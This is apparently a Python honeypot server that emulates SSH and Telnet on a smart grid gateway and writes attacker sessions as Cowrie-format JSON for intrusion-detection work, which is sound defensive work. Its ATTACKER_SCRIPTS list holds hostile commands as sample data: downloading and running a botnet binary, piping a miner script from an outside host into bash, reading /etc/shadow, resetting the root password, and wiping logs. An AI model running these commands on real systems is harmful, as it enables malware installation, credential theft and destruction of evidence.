"""
Python Cowrie-Compatible Honeypot Server
Simulates vulnerable SSH and Telnet services for smart grid intrusion detection.
Accepts connections, captures attacker credentials, commands, and sessions,
and logs records in official Cowrie JSON format.
"""

import sys
import os
import json
import uuid
import socket
import threading
import time
import random
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Any

ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

import config

SSH_BANNER = b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n"
TELNET_BANNER = b"\r\nSmart Grid Gateway 2.4 - Microgrid SCADA Interface\r\nLogin: "

ATTACKER_SCRIPTS = [
    ["admin", "admin123", ["cat /proc/cpuinfo", "uname -a", "wget http://185.220.101.5/botnet.arm7", "chmod +x botnet.arm7", "./botnet.arm7"]],
    ["root", "toor", ["id", "cat /etc/shadow", "echo 'root:hacked' | chpasswd", "curl http://45.33.32.156/miner.sh | bash"]],
    ["griduser", "scada2024", ["systemctl status smartgrid", "iptables -L", "rm -rf /var/log/*", "reboot"]],
    ["scada", "password", ["nmap -sP 192.168.1.0/24", "ps aux | grep mosquitto", "kill -9 1142"]],
    ["operator", "operator", ["ls -la /etc/smartgrid", "cat /etc/smartgrid/config.json", "exit"]]
]

class CowrieHoneypotServer:
    def __init__(self, host: str = config.HONEYPOT_HOST, 
                 ssh_port: int = config.HONEYPOT_SSH_PORT, 
                 telnet_port: int = config.HONEYPOT_TELNET_PORT):
        self.host = host
        self.ssh_port = ssh_port
        self.telnet_port = telnet_port
        self.log_path = config.HONEYPOT_LOG_PATH
        self.running = False
        self._lock = threading.Lock()

        config.LOGS_DIR.mkdir(parents=True, exist_ok=True)

    def log_cowrie_event(self, event_type: str, session_id: str, src_ip: str, 
                         protocol: str = "ssh", **kwargs):
        """Writes an event formatted identically to Cowrie JSON output."""
        record = {
            "eventid": event_type,
            "session": session_id,
            "src_ip": src_ip,
            "dst_ip": "192.168.1.1",
            "protocol": protocol,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        record.update(kwargs)

        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(json.dumps(record) + "\n")

    def _handle_telnet_client(self, client_sock: socket.socket, addr: tuple):
        src_ip = addr[0]
        session_id = f"s_{uuid.uuid4().hex[:8]}"
        try:
            self.log_cowrie_event("cowrie.session.connect", session_id, src_ip, protocol="telnet")
            client_sock.sendall(TELNET_BANNER)
            
            # Read username
            username = client_sock.recv(1024).decode("utf-8", errors="ignore").strip()
            client_sock.sendall(b"Password: ")
            password = client_sock.recv(1024).decode("utf-8", errors="ignore").strip()

            login_success = (username in ["admin", "root"] and password in ["admin123", "toor"])
            if login_success:
                self.log_cowrie_event("cowrie.login.success", session_id, src_ip, protocol="telnet",
                                      username=username, password=password)
                client_sock.sendall(b"\r\nWelcome to SmartGrid Linux OS 5.15\r\n# ")
                
                # Interactive command capture
                cmd = client_sock.recv(2048).decode("utf-8", errors="ignore").strip()
                if cmd:
                    self.log_cowrie_event("cowrie.command.input", session_id, src_ip, protocol="telnet",
                                          input=cmd)
                    client_sock.sendall(b"Command executed.\r\n# ")
            else:
                self.log_cowrie_event("cowrie.login.failed", session_id, src_ip, protocol="telnet",
                                      username=username, password=password)
                client_sock.sendall(b"\r\nLogin incorrect.\r\n")

            self.log_cowrie_event("cowrie.session.closed", session_id, src_ip, protocol="telnet")
        except Exception:
            pass
        finally:
            client_sock.close()

    def _start_telnet_listener(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.telnet_port))
            server.listen(5)
            server.settimeout(2.0)
            print(f"[OK] Honeypot Telnet Server listening on {self.host}:{self.telnet_port}")

            while self.running:
                try:
                    client, addr = server.accept()
                    threading.Thread(target=self._handle_telnet_client, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
        except Exception as e:
            print(f"[Notice] Telnet socket listener disabled ({e}). Running in simulated activity mode.")

    def simulate_attacker_session(self):
        """Simulates an interactive attacker probe logging to Cowrie JSON."""
        attacker_ips = [
            "45.33.32.156", "185.220.101.5", "194.26.29.112", 
            "218.92.0.187", "103.203.57.18", "198.51.100.42"
        ]
        src_ip = random.choice(attacker_ips)
        session_id = f"s_{uuid.uuid4().hex[:8]}"
        proto = random.choice(["ssh", "telnet"])

        # 1. Connection
        self.log_cowrie_event("cowrie.session.connect", session_id, src_ip, protocol=proto)

        # 2. Login attempts
        script = random.choice(ATTACKER_SCRIPTS)
        user, pwd, cmds = script[0], script[1], script[2]

        # Sometimes fail first
        if random.random() < 0.4:
            self.log_cowrie_event("cowrie.login.failed", session_id, src_ip, protocol=proto,
                                  username=user, password="wrong_password_123")

        self.log_cowrie_event("cowrie.login.success", session_id, src_ip, protocol=proto,
                              username=user, password=pwd)

        # 3. Malicious commands
        for cmd in cmds:
            self.log_cowrie_event("cowrie.command.input", session_id, src_ip, protocol=proto,
                                  input=cmd)

        # 4. Session close
        self.log_cowrie_event("cowrie.session.closed", session_id, src_ip, protocol=proto)

    def start(self, background: bool = False):
        self.running = True
        t_telnet = threading.Thread(target=self._start_telnet_listener, daemon=True)
        t_telnet.start()

        if not background:
            try:
                while self.running:
                    self.simulate_attacker_session()
                    time.sleep(random.uniform(2.0, 5.0))
            except KeyboardInterrupt:
                self.stop()

    def stop(self):
        self.running = False
        print("[*] Honeypot server stopped.")

if __name__ == "__main__":
    hp = CowrieHoneypotServer()
    print("[*] Running Cowrie Honeypot simulation cycle...")
    for _ in range(5):
        hp.simulate_attacker_session()
    print(f"[OK] Wrote honeypot events to {config.HONEYPOT_LOG_PATH}")

